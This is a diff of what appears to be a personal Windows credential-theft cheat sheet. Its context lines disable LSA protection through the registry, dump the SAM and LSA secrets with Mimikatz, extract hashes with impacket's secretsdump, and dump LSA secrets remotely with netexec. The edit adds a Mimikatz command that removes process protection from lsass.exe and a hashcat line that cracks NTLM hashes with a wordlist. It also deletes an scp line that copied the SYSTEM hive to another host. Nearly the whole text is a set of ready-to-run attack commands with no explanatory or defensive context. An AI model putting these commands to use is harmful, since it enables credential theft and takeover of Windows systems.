@@ -17,6 +17,10 @@ C:\Windows\System32\config\SECURITY ( Security Policy ) HKLM\SECURITY\Policy\Sec
 # Disable RunAsPPL
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 
+Mimikatz:
+!+
+!processprotect /process:lsass.exe /remove
+
 # Shadow Copy
 vssadmin list shadows ( List Available Shadows )
 
@@ -41,14 +45,13 @@ token::elevate
 lsadump::sam
 lsadump::lsa /patch
 
-# File Uploader
-scp C:\Windows\System32\config\SYSTEM sako@192.168.0.250:/home/sako/Labaratory/ ( SSH File Sender )
-
 # Hash Cracker
 pip3 install impacket
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    User       RID            LMHASH                            NTLMHASH
+
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 # Hash Dump with netexec
 netexec smb <IP> --local-auth -u <USER> -p <PASS> --lsa
